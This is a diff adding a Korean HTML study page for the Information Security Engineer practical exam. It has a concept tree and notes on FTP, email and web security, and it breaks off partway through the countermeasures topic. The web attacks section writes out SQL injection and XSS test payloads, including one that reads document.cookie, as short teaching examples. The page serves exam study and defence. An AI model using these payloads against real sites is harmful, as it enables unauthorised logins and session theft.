@@ -1,0 +1,424 @@
+<!doctype html><html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>정보보안기사실기_개념정리</title>
+<style>:root{
+  --bg:#f4f6f9; --surface:#ffffff; --ink:#18212e; --muted:#5a6676; --line:#dde2ea;
+  --accent:#1f56b8; --accent-soft:#e6eefb; --mark:#fff1b8; --mark-ink:#5c4700;
+  --term-bg:#16202c; --term-ink:#d7e3f2; --ok:#1d7a4f; --warn:#b4541b; --warn-soft:#fbeee4;
+  --f-display:"IBM Plex Sans KR","Noto Sans KR",system-ui,sans-serif;
+  --f-body:"Noto Sans KR",system-ui,-apple-system,"Malgun Gothic",sans-serif;
+  --f-mono:"JetBrains Mono",ui-monospace,Consolas,monospace;
+}
+
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--f-body);font-size:14px;line-height:1.6;padding:20px 16px 60px}
+.wrap{max-width:920px;margin:0 auto}header{margin-bottom:12px}.eyebrow{font-size:11px;letter-spacing:.12em;color:var(--muted);font-weight:700}
+h1{font-family:var(--f-display);font-size:22px;margin:2px 0 0;line-height:1.3}h1 small{display:block;font-size:12px;color:var(--muted);font-weight:500;margin-top:3px}
+nav.top{position:sticky;top:0;z-index:5;background:var(--bg);padding:8px 0;margin-bottom:10px;display:flex;flex-wrap:wrap;gap:6px;border-bottom:1px solid var(--line)}
+nav.top a{text-decoration:none;color:var(--ink);background:var(--surface);border:1px solid var(--line);border-radius:999px;padding:3px 11px;font-size:12.5px}
+nav.top a:hover{border-color:var(--accent);color:var(--accent)}
+.subj{margin:0 0 28px}.subj-head{margin:18px 0 10px;padding-bottom:6px;border-bottom:2px solid var(--accent)}
+.subj-head h2{font-family:var(--f-display);font-size:18px;margin:0}.note{font-size:12px;color:var(--muted);margin-top:2px}
+.topic{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:14px 18px;margin:0 0 12px}
+.topic h2{font-family:var(--f-display);font-size:16px;margin:0 0 2px;display:flex;align-items:center;gap:8px}
+.n{display:inline-grid;place-items:center;width:24px;height:24px;border-radius:6px;background:var(--accent);color:#fff;font-family:var(--f-mono);font-size:12px;flex:0 0 auto}
+.qs{font-size:11px;color:var(--muted);font-family:var(--f-mono);margin-bottom:8px}
+.why{margin:0 0 10px;padding:8px 12px;background:var(--accent-soft);border-radius:8px;font-size:13.5px}
+.why::before{content:"왜 배우나 · ";font-weight:700;color:var(--accent)}
+.topic>ul{margin:0;padding-left:20px}.topic li{margin:3px 0}.topic ul ul{margin:3px 0 4px;padding-left:18px}
+code{font-family:var(--f-mono);font-size:.9em;background:var(--bg);border:1px solid var(--line);border-radius:4px;padding:0 4px}
+mark{background:var(--mark);color:var(--mark-ink);padding:0 2px;border-radius:2px}
+ .tree details{margin:0}.tree summary{cursor:pointer;list-style:none;position:relative;padding-left:16px;line-height:1.5} .tree summary::before{content:"▸";position:absolute;left:0;color:var(--muted);transition:transform .15s}.tree details[open]>summary::before{transform:rotate(90deg)} .tree .t1{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:10px 14px;margin:0 0 10px} .tree .t1>summary{font-family:var(--f-display);font-size:15.5px;font-weight:700} .tree .t2{margin:6px 0 4px 6px;padding-left:10px;border-left:2px solid var(--accent)}.tree .t2>summary{font-size:13.5px;font-weight:700;color:var(--accent)} .tree .t3{margin:4px 0 4px 8px;padding-left:10px;border-left:1px dashed var(--line)}.tree .t3>summary{font-size:13px;font-weight:600} .tree .un{font-family:var(--f-mono);color:var(--muted);font-size:11px;margin-right:6px} .tree ul.terms{list-style:none;margin:4px 0 2px 14px;padding:0;display:flex;flex-wrap:wrap;gap:4px 6px} .tree ul.terms li{font-size:12.5px;background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:1px 8px} 
+.tree .t4{margin:6px 0 6px 10px;padding:6px 0 6px 10px;border-left:1px solid var(--line)}.tree .t4h{font-size:13px;display:flex;flex-wrap:wrap;align-items:center;gap:6px;color:var(--ink)} .tree .qn{font-family:var(--f-mono);font-size:11px;color:var(--muted)}.tree .lab{font-size:10px;font-weight:700;border-radius:4px;padding:0 5px;border:1px solid var(--line)}.tree .lab.s{color:#9a5b00}.tree .lab.d{color:var(--accent)} .tree ul.terms li.none{background:none;border:0;color:var(--muted);font-style:italic} @media (max-width:640px){.tree .t4h{font-size:15px}.tree .qn{font-size:12px}.tree .lab{font-size:11px}.tree .t4{margin-left:4px;padding-left:8px}}  .tree .cnt{font-family:var(--f-mono);font-size:10.5px;color:var(--muted);font-weight:400;margin-left:4px} .tree ul.ctree{list-style:none;margin:4px 0 2px 8px;padding:0 0 0 10px;border-left:1px solid var(--line)} .tree ul.ctree>li{position:relative;padding:3px 0 3px 12px;font-size:13.5px}.tree ul.ctree>li::before{content:"";position:absolute;left:-10px;top:14px;width:10px;border-top:1px solid var(--line)} .tree ul.ctree .c{font-weight:700} .tree ul.ctree ul{list-style:none;margin:2px 0 0 4px;padding:0 0 0 12px;border-left:1px dashed var(--line)} .tree ul.ctree ul li{position:relative;padding:1px 0 1px 10px;font-size:13px;color:var(--ink)}.tree ul.ctree ul li::before{content:"";position:absolute;left:-12px;top:12px;width:10px;border-top:1px dashed var(--line)} @media (max-width:640px){.tree ul.ctree>li{font-size:16px}.tree ul.ctree ul li{font-size:15px}}  .tree ol.toc{margin:4px 0 4px 6px;padding-left:28px;font-size:13.5px;line-height:1.7}.tree ol.toc li{padding-left:4px} @media (max-width:640px){.tree ol.toc{font-size:16px;padding-left:26px}} footer{margin-top:14px;font-size:11px;color:var(--muted);text-align:center}
+@media (max-width:640px){ body{font-size:16px;line-height:1.65;padding:14px 12px 60px} h1{font-size:21px}h1 small{font-size:13px} nav.top a{font-size:14px;padding:6px 13px} .subj-head h2{font-size:19px}.note{font-size:13px} .topic{padding:14px 14px}.topic h2{font-size:17px}.qs{font-size:12px}.why{font-size:15px} .tree .t1>summary{font-size:18px}.tree .t2>summary{font-size:16.5px}.tree .t3>summary{font-size:16px} .tree summary{padding:4px 0 4px 18px} .tree ul.terms li{font-size:15px;padding:4px 11px;border-radius:8px} .tree ul.terms{gap:6px 8px;margin-left:8px} .tree .t2{margin-left:2px;padding-left:8px}.tree .t3{margin-left:4px;padding-left:8px} code{font-size:.95em} } @media print{body{padding:0;font-size:11.5px;background:#fff;color:#000}nav.top{display:none}.topic{border:0;padding:6px 0;margin:0 0 10px;break-inside:avoid}.why{background:#f2f2f2}.subj{break-before:page}}
+</style></head><body><div class="wrap">
+<header><div class="eyebrow">정보보안기사 실기 · 기출 개념 정리</div><h1>과목별 개념 정리<small>주제마다 '왜 배우나' 한 줄 → 개념 정리. 회색 줄은 관련 챕터·단원·문제 번호. 굵은 글씨는 시험에 그대로 나오는 용어</small></h1></header>
+<nav class="top"><a href="#tree">용어 트리</a><a href="#c3">3과목</a><a href="#c4">4과목</a><a href="#c5">5과목</a><a href="#c6">6과목</a></nav>
+<section class="subj" id="tree"><div class="subj-head"><h2>용어 목차 (전 과목)</h2><div class="note">과목 → 챕터 → 단원 → 개념 329개 · 번호는 과목.챕터.단원.개념 순 · 항목을 누르면 접고 펼 수 있음</div></div><div class="tree">
+<details class="t1" open><summary>1. 운영체제 보안</summary>
+<details class="t2" open><summary>1.1 ch1 정보시스템</summary>
+<details class="t3" open><summary>1.1.1 운영체제 개론</summary><ol class="toc"><li>쉘(Shell)</li></ol></details>
+<details class="t3" open><summary>1.1.2 윈도우</summary><ol class="toc"><li>PE 포맷</li><li>PE 섹션</li><li>비트 락커(BitLocker)</li><li>윈도우 로그 경로</li><li>윈도우 기본 그룹</li><li>NTFS</li><li>net session</li><li>net share</li><li>UAC(사용자 계정 컨트롤)</li></ol></details>
+<details class="t3" open><summary>1.1.3 유닉스/리눅스</summary><ol class="toc"><li>저널링</li><li>유닉스/리눅스 디렉터리</li><li>RUID · EUID · SUID</li><li>/etc/shadow</li><li>strace</li><li>/etc/passwd</li><li>PAM</li><li>lsof</li><li>SetUID · SetGID · Sticky Bit</li><li>find</li><li>cron</li><li>crontab</li><li>xinetd</li><li>레인보우 테이블</li><li>pwconv · pwunconv</li><li>umask</li></ol></details>
+<details class="t3" open><summary>1.1.4 시스템 정보</summary><ol class="toc"><li>lastlog</li><li>sulog</li><li>loginlog</li><li>btmp</li><li>xferlog</li><li>utmp</li><li>wtmp</li><li>acct/pacct</li><li>logrotate</li><li>/var/log/messages</li><li>lastb</li><li>lastcomm</li><li>last</li><li>chattr · lsattr</li><li>윈도우 이벤트 뷰어</li></ol></details>
+</details>
+<details class="t2" open><summary>1.2 ch2 취약점 점검</summary>
+<details class="t3" open><summary>1.2.1 취약점 점검</summary><ol class="toc"><li>root 원격 접속 제한</li><li>login.defs</li><li>핫픽스(Hotfix)</li><li>패치 관리</li><li>pam_tally.so</li><li>/etc/pam.d/system-auth</li><li>/etc/shadow 권한</li><li>SUID · SGID 점검</li><li>NetBIOS 바인딩</li><li>ncpa.cpl</li><li>패스워드 최소 길이 설정</li><li>TMOUT</li><li>/etc/securetty</li><li>world writable</li></ol></details>
+</details>
+</details>
+<details class="t1" open><summary>2. 네트워크 보안</summary>
+<details class="t2" open><summary>2.1 ch1 네트워크 일반</summary>
+<details class="t3" open><summary>2.1.1 네트워크 개념 이해</summary><ol class="toc"><li>SNMP 폴링 · 이벤트 리포팅</li><li>Syslog</li><li>HTTP OPTIONS</li><li>netstat -rn 라우팅 테이블</li><li>SNMPv3 보안 매개변수</li><li>TCP 3-Way Handshake</li><li>SNMP 포트(161 · 162)</li><li>RIP · OSPF · BGP · EIGRP</li><li>서브넷 마스크 2진수 변환</li><li>CSMA/CA · RTS/CTS</li><li>SNMP</li><li>MAC 주소 필터링</li><li>MAC 스푸핑</li><li>HTTP 헤더 보안 취약점</li><li>TCP 4-Way Handshake</li><li>TCP 플래그 비트</li></ol></details>
+<details class="t3" open><summary>2.1.2 네트워크의 활용</summary><ol class="toc"><li>VLAN</li><li>ARP 브로드캐스트 주소</li><li>스위치 전송방식</li><li>RARP</li><li>VLAN 구성 방식</li><li>스위칭 허브 기능</li></ol></details>
+</details>
+<details class="t2" open><summary>2.2 ch2 네트워크 기반 공격기술</summary>
+<details class="t3" open><summary>2.2.1 네트워크 기반 공격기술</summary><ol class="toc"><li>스머프(Smurf) 공격</li><li>Directed Broadcast</li><li>티어드롭(Teardrop) 공격</li><li>Slowloris 공격</li><li>HTTP 응답 분할(CR · LF)</li><li>멤캐시드(Memcached) 반사 공격</li><li>랜드 어택</li><li>SYN Flooding</li><li>SSDP 반사 공격</li><li>DGA</li><li>HTTP Request Smuggling</li><li>Slow Read Attack</li><li>Cache-Control 공격</li><li>HTTP 헤더(Referer · Cache-Control)</li><li>HTTP GET Flooding</li><li>ndd 명령어</li><li>NTP 증폭 공격(monlist)</li><li>Billion Laughs Attack</li><li>NTP DDoS 대응</li></ol></details>
+<details class="t3" open><summary>2.2.2 스캐닝</summary><ol class="toc"><li>스텔스 스캔(FIN · NULL · Xmas)</li><li>TCP Open · Half-Open Scan</li><li>TCP ACK Scan</li></ol></details>
+<details class="t3" open><summary>2.2.3 스푸핑 공격, 스니핑 공격</summary><ol class="toc"><li>Switch Jamming</li><li>ARP 스푸핑</li><li>TCP 세션 하이재킹</li><li>정적 ARP(arp -s)</li><li>Promiscuous Mode</li><li>스니핑 대응</li><li>스니핑 탐지(ping · ARP)</li><li>ARP 리다이렉트</li></ol></details>
+</details>
+<details class="t2" open><summary>2.3 ch3 네트워크 보안 기술</summary>
+<details class="t3" open><summary>2.3.1 보안 프로토콜</summary><ol class="toc"><li>SSL/TLS Record 프로토콜</li><li>IPSec(AH · ESP)</li><li>TLS 1.3 핸드쉐이크(1-RTT · 0-RTT)</li><li>DTLS</li><li>E2EE</li><li>AH Sequence Number</li><li>AH와 NAT(ICV)</li><li>사전 공유키(PSK)</li><li>VPN 터널링 프로토콜</li><li>IPSec 전송 · 터널 모드</li><li>IPSec 보안 서비스</li><li>AH · ESP 인증 · 암호화 구간</li><li>IKE</li><li>ESP 터널 모드 패킷 구조</li></ol></details>
+<details class="t3" open><summary>2.3.2 네트워크 보안 기술 및 응용</summary><ol class="toc"><li>SIEM 주요 기능</li><li>HIDS · NIDS</li><li>오탐 · 미탐</li><li>NAC</li><li>오용 탐지 · 이상 탐지</li><li>L2F · PPTP · IPSec</li><li>TMS</li><li>SOAR</li><li>미러링 모드 · 인라인 모드</li><li>Tiny Fragment 공격</li><li>Ingress · Egress 필터링</li><li>상태 기반 패킷 검사</li><li>IDS 대응 행위</li><li>ESM 구성요소</li></ol></details>
+<details class="t3" open><summary>2.3.3 보안 프로토콜 이해</summary><ol class="toc"><li>WEP(RC4 · IV · CRC-32)</li><li>WEP · WPA · WPA2 · WPA3</li><li>WEP 암호화 계산(CRC · XOR)</li><li>aircrack-ng</li></ol></details>
+</details>
+<details class="t2" open><summary>2.4 ch4 취약점 점검</summary>
+<details class="t3" open><summary>2.4.1 네트워크 장비 설정 및 취약점 보안</summary><ol class="toc"><li>Ingress · Egress · Blackhole 필터링</li><li>확장 ACL(access-list)</li><li>SNMP 비활성화</li><li>VLAN 종류 · show vlan</li><li>라우터 패스워드 명령어</li><li>Smurf 차단 ACL</li><li>SNMP 보안 설정</li></ol></details>
+<details class="t3" open><summary>2.4.2 보안장비 설정 취약점 점검</summary><ol class="toc"><li>보안장비 계정관리 점검</li></ol></details>
+</details>
+</details>
+<details class="t1" open><summary>3. 애플리케이션 보안</summary>
+<details class="t2" open><summary>3.1 ch1 인터넷 응용 보안</summary>
+<details class="t3" open><summary>3.1.1 FTP 보안</summary><ol class="toc"><li>TFTP</li><li>익명 FTP</li><li>FTP Bounce</li><li>TCP Wrapper</li><li>FTP Active · Passive 모드</li><li>FTP 동작 절차</li></ol></details>
+<details class="t3" open><summary>3.1.2 이메일 보안</summary><ol class="toc"><li>PGP</li><li>SPF · DKIM · DMARC</li><li>이메일 헤더 분석</li></ol></details>
+<details class="t3" open><summary>3.1.3 웹 애플리케이션 보안</summary><ol class="toc"><li>XSS</li><li>SQL 삽입</li><li>CSRF</li><li>OWASP Top 10</li><li>프록시 서버</li><li>파일 업로드 · SQL 삽입</li><li>파일 삽입 취약점</li><li>웹 쉘</li><li>robots.txt</li><li>입력 데이터 검증 취약점</li><li>딥링크</li><li>아파치 로그(httpd.conf)</li><li>SQL 삽입 대응</li><li>웹 프록시 도구</li><li>SSRF</li><li>IIS 웹로그 분석</li><li>디렉터리 인덱싱</li><li>SQL 삽입 쿼리 조작</li><li>cron 역방향 쉘</li><li>robots.txt 규칙</li><li>Apache 설정(httpd.conf)</li><li>XXE 인젝션</li><li>XSS 종류</li></ol></details>
+<details class="t3" open><summary>3.1.4 DNS 보안</summary><ol class="toc"><li>존 파일 · 자원 레코드</li><li>DNS 포트 · 캐시 · TTL</li><li>hosts 파일</li><li>DNS 스푸핑</li><li>서브 도메인 하이재킹</li><li>네임 서버 종류</li><li>DNS 증폭 공격</li></ol></details>
+<details class="t3" open><summary>3.1.5 데이터베이스 보안</summary><ol class="toc"><li>접근·추론·흐름 통제</li><li>집합성·추론·데이터 디들링</li><li>DB 암호화 방식</li><li>MySQL bind-address</li></ol></details>
+</details>
+<details class="t2" open><summary>3.2 ch2 애플리케이션 보안 취약점</summary>
+<details class="t3" open><summary>3.2.1 애플리케이션 보안 취약점</summary><ol class="toc"><li>CVE 표기 방식</li><li>POODLE</li><li>CVSS</li><li>하트 블리드</li><li>Log4j · Log4Shell</li><li>하트 블리드 점검·대응</li></ol></details>
+<details class="t3" open><summary>3.2.2 애플리케이션 개발 보안</summary><ol class="toc"><li>블랙·화이트·그레이박스 테스트</li><li>불안전한 암호화 저장 점검</li><li>XML 조회 검증</li><li>소스코드 보안 취약점 7유형</li><li>CBD 분석 단계 산출물</li></ol></details>
+</details>
+<details class="t2" open><summary>3.3 ch3 시스템 공격 기법</summary>
+<details class="t3" open><summary>3.3.1 시스템 공격 기법</summary><ol class="toc"><li>버퍼 오버플로우 · strcpy</li><li>사이버 킬 체인</li><li>스택·힙 영역</li><li>공급망 공격</li><li>DDE</li><li>MITRE ATT&amp;CK</li><li>크리덴셜 스터핑</li><li>레이스 컨디션</li><li>APT</li><li>TEMPEST · DPA</li><li>제로 데이 공격</li><li>스택 가드(Canary)</li><li>ASLR</li></ol></details>
+<details class="t3" open><summary>3.3.2 시스템 공격 기술의 이해 및 관리</summary><ol class="toc"><li>다운로더·드롭퍼·인젝터</li><li>멀버타이징</li></ol></details>
+<details class="t3" open><summary>3.3.3 시스템 분석 도구</summary><ol class="toc"><li>Tripwire · Nessus</li></ol></details>
+</details>
+<details class="t2" open><summary>3.4 ch4 취약점 점검</summary>
+<details class="t3" open><summary>3.4.1 서비스 보안 설정 점검과 보안</summary><ol class="toc"><li>allow-transfer</li><li>XSS 점검 스크립트</li><li>httpd.conf Indexes</li><li>Sendmail 릴레이 제한</li><li>Prepared Statement</li><li>access 옵션(RELAY · DISCARD)</li><li>HttpOnly</li><li>정적·동적 데이터 마스킹</li><li>dig · AXFR Zone Transfer</li><li>파일 업로드 점검·조치</li><li>.htaccess(FilesMatch · AddType)</li><li>Set-Cookie(Secure · HttpOnly)</li><li>Apache 디렉터리 설정 문제점</li><li>SQL Injection 방어(Prepared Statement)</li><li>쿠키 속성(Secure · HttpOnly · Expires)</li><li>PHP 파일 업로드 취약점</li><li>DBA 권한(CREATE · ALTER · DROP)</li><li>DB 접근 권한 최소화</li><li>Oracle 감사 매개변수(AUDIT_TRAIL)</li><li>로그인 배너 · 경고 메시지 설정</li><li>xinetd tftp · talk 비활성화(disable)</li></ol></details>
+</details>
+</details>
+<details class="t1" open><summary>4. 보안 관제 및 침해사고 대응</summary>
+<details class="t2" open><summary>4.1 ch1 보안 도구</summary>
+<details class="t3" open><summary>4.1.1 보안 운영 도구</summary><ol class="toc"><li>Snort Rule(content · msg)</li><li>Snort offset · depth</li><li>ModSecurity</li><li>수리카타(Suricata)</li><li>YARA</li><li>Snort threshold type(limit · threshold · both)</li><li>PCRE 룰 성능 부하</li><li>wireshark SYN 패킷 분석</li><li>TCP SYN Flooding · iptables limit</li><li>iptables -j(DROP · REJECT)</li><li>Snort 룰 작성(Telnet 23)</li><li>Snort action(drop · reject · sdrop)</li><li>HTTP Get Flooding 탐지 룰</li><li>NTP monlist DDoS · iptables length</li><li>Snort distance · nocase(XSS 탐지)</li><li>content:! · |00| 바이너리 패턴</li><li>iptables recent 모듈</li><li>iptables Chain(INPUT · FORWARD · OUTPUT)</li></ol></details>
+<details class="t3" open><summary>4.1.2 보안 점검 도구</summary><ol class="toc"><li>Wireshark 필터(dns.response_to)</li><li>hping3</li><li>tcpdump 단편화 정보(frag ID:SIZE@OFFSET+)</li><li>tcpdump 옵션 · BPF</li></ol></details>
+</details>
+<details class="t2" open><summary>4.2 ch2 로그 및 침해사고 분석</summary>
+<details class="t3" open><summary>4.2.1 로그 분석</summary><ol class="toc"><li>Drive By Download</li><li>정적 분석 · 동적 분석</li><li>SysAnalyzer 스냅샷 분석(레지스트리)</li><li>Apache 로그 분석</li><li>PE 파일 분석(정적 · 동적 · 자동화)</li></ol></details>
+<details class="t3" open><summary>4.2.2 침해사고 분석</summary><ol class="toc"><li>netstat SYN-RECEIVED(TCP SYN Flooding)</li><li>웹 로그 SQL Injection(URL 인코딩)</li><li>쉘쇼크 · 웹 쉘</li><li>HTTP GET Flooding Snort 룰</li><li>Blind SQL Injection(substr)</li><li>Slowloris(Slow HTTP Header DoS)</li><li>쉘 쇼크 리버스 쉘</li><li>Smurf 공격(Directed Broadcast)</li><li>Boolean-based Blind SQLi · SQL Injection 대응</li><li>HeartBleed 탐지 Snort 룰(distance · within)</li><li>/proc 기반 삭제된 백도어 분석</li><li>RUDY Attack(Slow HTTP POST DoS)</li><li>IIS 유니코드 취약점(%c1%1c)</li><li>DNS 증폭 공격(ANY 질의)</li><li>익명(anonymous) FTP 공격 · nocase</li><li>SQL Injection 로그인 우회('1'='1'#)</li><li>HeartBleed 점검·대응(시스템적 · 서비스적)</li></ol></details>
+</details>
+</details>
+<details class="t1" open><summary>5. 정보보안 일반</summary>
+<details class="t2" open><summary>5.1 ch1 암호학</summary>
+<details class="t3" open><summary>5.1.1 암호 알고리즘</summary><ol class="toc"><li>Diffie-Hellman 키 교환</li></ol></details>
+<details class="t3" open><summary>5.1.2 해시함수</summary><ol class="toc"><li>Pass-the-Hash</li></ol></details>
+</details>
+<details class="t2" open><summary>5.2 ch2 ISMS-P 및 정보보호 제품인증</summary>
+<details class="t3" open><summary>5.2.1 인증</summary><ol class="toc"><li>EAM · IAM 비교</li></ol></details>
+<details class="t3" open><summary>5.2.2 접근통제</summary><ol class="toc"><li>MAC · DAC · RBAC</li><li>벨-라파듈라(BLP) · 비바(Biba) 모델</li></ol></details>
+<details class="t3" open><summary>5.2.3 전자서명</summary><ol class="toc"><li>인증서 고정(Certificate Pinning)</li></ol></details>
+</details>
+<details class="t2" open><summary>5.3 ch3 기타</summary>
+<details class="t3" open><summary>5.3.1 기타</summary><ol class="toc"><li>쉘 코드 · NOP(0x90)</li><li>RET · JMP · CALL 기계어</li><li>IaaS · PaaS · SaaS</li><li>EDR</li><li>비트코인 · 블록체인 · 채굴</li><li>x64 함수 인자 레지스터(RDI · RSI · RDX · RCX)</li><li>동적 링킹 · PLT · GOT</li><li>DLP</li><li>디지털 포렌식</li><li>디지털 포렌식 5원칙 · 절차</li><li>BYOD 보안(MDM · 컨테이너화 · 모바일 가상화)</li></ol></details>
+</details>
+</details>
+<details class="t1" open><summary>6. 위험분석 및 정보보안 관리</summary>
+<details class="t2" open><summary>6.1 ch1 정보보호 및 위험관리</summary>
+<details class="t3" open><summary>6.1.1 정보보호관리</summary><ol class="toc"><li>정보보호 정책 · 표준 · 지침 · 절차</li><li>정보보호정책 구성 요건</li><li>기밀성 · 무결성 · 가용성(CIA)</li><li>위험평가 · DoA</li><li>책임추적성 · 부인방지 · 인증</li><li>정보보호정책</li><li>정보보호 거버넌스</li></ol></details>
+<details class="t3" open><summary>6.1.2 위험</summary><ol class="toc"><li>위험 평가 · 위험 관리 · 위험 관리 계획</li><li>자산목록 · 자산분석</li><li>정성적 위험 분석(델파이 · 시나리오 · 순위 결정법)</li><li>퍼지 행렬법</li><li>위험 구성요소(자산 · 위협 · 취약성 · 정보보호 대책)</li><li>위험 처리(수용 · 완화 · 전가 · 회피)</li><li>위험 분석 접근법(기준선 · 비정형 · 상세 · 통합)</li><li>위험 분석 · 위험평가 · 위험 완화</li><li>위험 수용</li><li>예방 · 탐지 · 교정 통제</li><li>물리적 · 논리적 접근 통제</li><li>잔여 위험 공식</li><li>위험 요소 간 영향 관계도</li><li>정량적 위험 분석(SLE · ALE · EF · ARO)</li><li>ISO 31000 위험 관리 프레임워크</li><li>위험 분석 절차</li><li>위험 관리 과정</li><li>자산 식별 · 평가 · 그룹핑</li><li>복합 접근법 장단점</li><li>ROI(투자 대비 수익률)</li><li>위험 평가서(자산 중요도 · 우려사항 · 가능성)</li><li>기밀성 등급(높음 · 중간 · 낮음)</li><li>자산 중요도 산정</li></ol></details>
+</details>
+</details>
+</div></section>
+<section class="subj" id="c3"><div class="subj-head"><h2>3과목 애플리케이션 보안</h2><div class="note">ch1 인터넷 응용 보안 · ch2 애플리케이션 보안 취약점 · ch3 시스템 공격 기법 · ch4 취약점 점검 · 주제 10개</div></div><article class="topic"><h2><span class="n">01</span>FTP 보안</h2><div class="qs">ch1-01 Q1~Q3 · 서술 Q1 · ch4 Q13</div><p class="why">FTP는 제어와 데이터를 다른 연결로 주고받는 특이한 구조라서, 방화벽 문제와 모드 차이를 묻는다. 익명 접속·배너 노출 같은 설정 취약점도 자주 나온다.</p><ul><li>두 개의 채널: <b>제어 채널</b>(명령·응답, 서버 <b>TCP 21</b>) + <b>데이터 채널</b>(파일 전송, 서버 <b>TCP 20</b>)</li>
+<li>모드
+  <ul><li><b>Active</b>(기본) — 서버가 20번 포트에서 클라이언트 쪽으로 데이터 연결을 시도 → 클라이언트 방화벽이 막으면 목록 조회 실패. 해결: 방화벽 예외 또는 Passive 사용</li>
+  <li><b>Passive</b> — 클라이언트가 서버의 <b>1024 이상 임의 포트</b>로 데이터 연결을 시도</li></ul></li>
+<li><b>TFTP</b> — UDP 기반의 단순 파일 전송. 인증 등 보안 기능 없음 / <b>익명 FTP</b> — 신원 확인 없이 접근 / <b>FTP Bounce</b> — FTP 서버를 경유해 제3의 호스트를 스캔·공격</li>
+<li><b>TCP Wrapper</b> — 네트워크 서비스 접근 제어. <code>/etc/hosts.allow</code>를 먼저 보고, 없으면 <code>/etc/hosts.deny</code> 확인</li>
+<li>배너 노출 대응: Telnet은 <code>/etc/issue.net</code>, FTP는 <code>/etc/vsftpd/vsftpd.conf</code>의 <code>ftpd_banner=</code>, SMTP는 sendmail.cf의 GreetingMessage, 로그온은 <code>/etc/motd</code></li>
+<li>xinetd 서비스 끄기: <code>/etc/xinetd.d/tftp</code> 등에서 <code>disable = yes</code></li></ul></article>
+<article class="topic"><h2><span class="n">02</span>이메일 보안: PGP · SPF · DKIM · Sendmail 릴레이</h2><div class="qs">ch1-02 Q1 · 서술 Q1·Q2 · ch4 Q4·Q6 · 서술 Q7</div><p class="why">메일은 발신자를 속이기 쉽다. 발신자 위조를 잡는 SPF·DKIM과, 내 서버가 스팸 중계지로 쓰이지 않게 하는 릴레이 제한이 핵심이다.</p><ul><li><b>PGP</b> — 1991년 필 짐머만 개발. 이메일에 기밀성·무결성·인증 제공. 표준 RFC 4880(OpenPGP). 메일 앱의 플러그인으로 사용</li>
+<li><b>SPF</b> — 메일 헤더의 발송 정보가 실제 발송 서버와 일치하는지 비교. 수신 서버가 MAIL FROM 도메인의 <b>DNS SPF(TXT) 레코드</b>를 조회해 발송 허용 IP인지 확인</li>
+<li><b>DKIM</b> — 송신 서버가 도메인 <b>개인키로 메일에 서명</b>하고 DNS에 공개키(TXT)를 등록. 수신 서버는 DKIM-Signature 헤더를 보고 DNS의 공개키로 검증</li>
+<li>Sendmail 릴레이 제한 (내 서버를 스팸 중계기로 못 쓰게)
+  <ul><li><code>/etc/mail/sendmail.cf</code>에서 <code>R$* $#error $@ 5.7.1 $: "550 Relaying denied"</code> 줄의 주석(#) 제거</li>
+  <li><code>/etc/mail/access</code>에 호스트별 정책: <b>RELAY</b>(허용) / OK(조건 없이 허용) / <b>REJECT</b>(거부) / <b>DISCARD</b>(받아서 버림)</li>
+  <li>변경 후 <code>makemap hash /etc/mail/access.db &lt; /etc/mail/access</code>로 DB 갱신</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">03</span>웹 공격의 종류</h2><div class="qs">ch1-03 Q1·Q2·Q4·Q5·Q6·Q8·Q9·Q13 · 서술 Q1·Q3·Q7·Q8</div><p class="why">웹 공격은 모두 '검증되지 않은 입력값'에서 시작한다. 각 공격이 입력값을 어디로 흘려보내는지(DB·브라우저·OS·파일·XML·서버)로 구분하면 정의가 외워진다.</p><ul><li><b>SQL Injection</b> — 입력값이 DB 질의문의 일부가 됨. <code>' or '1'='1</code>을 넣으면 WHERE 절이 항상 참 → 비밀번호 없이 로그인, 모든 데이터 조회. 로그 단서: <code>password=' or id='admin';--</code></li>
+<li><b>XSS</b> — 입력값이 다른 사용자의 <b>브라우저</b>에서 스크립트로 실행. 쿠키·세션 탈취, 악성 사이트로 리다이렉트
+  <ul><li><b>저장형</b> — 게시판 등 DB에 스크립트를 저장해 두고 보는 사람마다 실행 / <b>반사형</b> — 악성 URL을 클릭하면 서버 응답에 스크립트가 실려 실행</li>
+  <li>점검: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> 입력 후 경고창이 뜨는지</li></ul></li>
+<li><b>CSRF</b> — 사용자가 자신도 모르게 공격자가 의도한 요청을 특정 사이트에 보내게 함 (로그인된 세션을 이용)</li>
+<li><b>운영체제 명령어 삽입</b> — 입력값이 OS 명령으로 실행 / <b>파일 삽입(LFI/RFI)</b> — PHP의 <code>include, require</code>로 악성 스크립트를 읽어 실행. 대응: <code>php.ini</code>에서 <code>allow_url_fopen = Off</code></li>
+<li><b>파일 업로드</b> — 서버 스크립트 파일(웹쉘)을 올리고 실행 → 서버 장악. <b>웹 쉘</b> = PHP·ASP·JSP 등으로 작성된 원격 제어 스크립트</li>
+<li><b>XXE 인젝션</b> — XML에 외부 엔티티 선언을 넣어 서버가 파싱하면서 내부 파일 읽기·서버 동작 유도</li>
+<li><b>SSRF</b> — 서버 간 요청에 외부 입력을 허용해, 웹 서버가 공격자가 지정한 내부망·메타데이터 서버로 요청을 보내게 함</li>
+<li><b>딥링크</b> — 앱의 특정 화면으로 바로 가는 링크. 악용되면 앱 안의 민감 정보 노출</li>
+<li>OWASP Top 10에 늘 들어가는 세 가지: Injection, XSS, CSRF</li></ul></article>
+<article class="topic"><h2><span class="n">04</span>웹 공격 대응 설정</h2><div class="qs">ch1-03 Q10·Q11·Q12 · 서술 Q2·Q5·Q6 · ch4 Q2·Q3·Q5·Q7 · 서술 Q2·Q3·Q4·Q5·Q6·Q8·Q9·Q11</div><p class="why">ch4 취약점 점검은 대부분 '설정을 어떻게 고치느냐'다. Apache 지시자, 쿠키 속성, 파일 업로드 차단, Prepared Statement 코드를 그대로 쓸 수 있어야 한다.</p><ul><li>SQL Injection 대응
+  <ul><li><b>Prepared Statement</b> — 쿼리를 먼저 컴파일해 두고 입력값은 <b>매개변수</b>로만 처리 → 입력값이 SQL 코드가 되지 못함. 자바: <code>"... WHERE b_gubun = ?"</code> → <code>con.prepareStatement(sql)</code> → <code>pstmt.setString(1, gubun)</code> → <code>pstmt.executeQuery()</code></li>
